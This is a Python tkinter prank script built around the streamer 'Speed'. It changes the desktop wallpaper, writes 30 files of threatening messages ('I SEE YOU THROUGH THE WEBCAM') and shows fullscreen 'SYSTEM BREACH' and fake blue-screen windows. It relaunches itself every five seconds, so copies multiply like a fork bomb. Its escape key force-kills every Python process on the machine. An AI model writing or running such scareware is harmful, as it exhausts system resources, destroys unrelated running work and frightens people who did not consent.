import tkinter as tk
from PIL import Image, ImageTk
import os
import random
import subprocess
import sys

# 1. THE WALLPAPER HACK
def change_wallpaper():
    try:
        path = os.path.abspath("speed.png")
        os.system(f"gsettings set org.gnome.desktop.background picture-uri 'file://{path}'")
        os.system(f"gsettings set org.gnome.desktop.background picture-uri-dark 'file://{path}'")
    except:
        pass

# 2. CREATE WEIRD "CREEPY" FILES
folder = "Ishow speed secret files"
if not os.path.exists(folder):
    os.makedirs(folder)

weird_stuff = [
    "I AM COMING FOR U", "LOOK BEHIND YOU", "I SEE YOU THROUGH THE WEBCAM",
    "DO NOT CLOSE THE WINDOW", "SPEED IS UNDER YOUR BED", "HE IS BARKING IN THE WALLS",
    "RUN.", "IT IS TOO LATE", "SEWEYYYYYYYY...", "BARK BARK BARK"
]

for i in range(30):
    with open(os.path.join(folder, f"message_{i}.txt"), "w") as f:
        # Grabs 10 random creepy lines
        lines = [random.choice(weird_stuff) for _ in range(10)]
        f.write("\n".join(lines))

# 3. THE BLUE SCREEN OF DEATH (Activates after 30s)
def trigger_bsod():
    # Kill audio and stop other python instances to go "Quiet"
    os.system("pkill -9 mpg123")
    
    bsod = tk.Toplevel()
    bsod.attributes("-fullscreen", True)
    bsod.attributes("-topmost", True)
    bsod.config(bg='#0078D7') # Windows Blue
    bsod.config(cursor="none") # Hide the cursor entirely for the BSOD
    
    msg = (":(\n\nYour PC ran into a problem and needs to restart.\n"
           "We're just collecting some error info, and then we'll restart for you.\n\n"
           "0% complete\n\n"
           "Stop code: CRITICAL_SPEED_CRASHOUT\n"
           "What failed: speed.sys")
    
    tk.Label(bsod, text=msg, fg="white", bg="#0078D7", font=("Arial", 25), 
             justify="left", anchor="nw", padx=100, pady=100).pack(fill="both", expand=True)

    # Emergency Kill: Press 'q'
    bsod.bind('<q>', lambda e: os.system("pkill -9 -f python"))

# 4. FULL SCREEN SCARE
def trigger_scare():
    scare = tk.Toplevel()
    scare.attributes("-fullscreen", True)
    scare.attributes("-topmost", True)
    scare.config(bg='black')
    scare_label = tk.Label(scare, text="SYSTEM BREACH: SPEED TAKEOVER", fg="red", bg="black", font=("Arial", 40, "bold"))
    scare_label.pack(expand=True)
    
    scare.bind('<q>', lambda e: os.system("pkill -9 -f python"))

    def flash():
        current_color = scare_label.cget("fg")
        next_color = "green" if current_color == "red" else "red"
        scare_label.config(fg=next_color)
        scare.after(200, flash)
    flash()

# 5. THE BOUNCING WINDOW
root = tk.Tk()
root.attributes("-topmost", True)
root.overrideredirect(True)
root.config(bg='black')

# CHANGE CURSOR: This makes the cursor look like a "pirate" or "cross"
root.config(cursor="pirate") 

root.bind('<q>', lambda e: os.system("pkill -9 -f python"))

if os.path.exists("speed.png"):
    img = Image.open("speed.png").resize((250, 250))
    photo = ImageTk.PhotoImage(img)
    tk.Label(root, text="BARK BARK BARK SPEEDY", fg="white", bg="red", font=("Arial", 10, "bold")).pack()
    label = tk.Label(root, image=photo, bg='black')
    label.image = photo 
    label.pack()

x, y = random.randint(0, 400), random.randint(0, 400)
dx, dy = random.choice([8, -8]), random.choice([8, -8])
screen_w = root.winfo_screenwidth()
screen_h = root.winfo_screenheight()

def bounce_and_shake():
    global x, y, dx, dy
    x += dx
    y += dy
    shake_x, shake_y = x + random.randint(-8, 8), y + random.randint(-8, 8)
    
    if x <= 0 or x >= screen_w - 250: dx = -dx
    if y <= 0 or y >= screen_h - 280: dy = -dy
    
    root.geometry(f"+{int(shake_x)}+{int(shake_y)}")
    # Randomly warp the cursor around to make it "weird"
    if random.random() > 0.9:
        root.event_generate('<Motion>', warp=True, x=random.randint(0, 250), y=random.randint(0, 250))
        
    root.after(15, bounce_and_shake)

# 6. DUPLICATION (Every 5 seconds)
def duplicate():
    # Only duplicate if BSOD hasn't happened yet
    subprocess.Popen([sys.executable] + sys.argv)
    root.after(5000, duplicate) 

# 7. AUDIO LOOP
def loop_sound():
    if os.path.exists("speed_sound.mp3"):
        subprocess.Popen(["mpg123", "-q", "speed_sound.mp3"])
    root.after(7000, loop_sound)

# --- EXECUTION ---
change_wallpaper()
loop_sound()
duplicate() 
bounce_and_shake()

# Timers
root.after(5000, trigger_scare)  # Scare starts at 5s
root.after(30000, trigger_bsod) # Everything dies at 30s

root.mainloop()

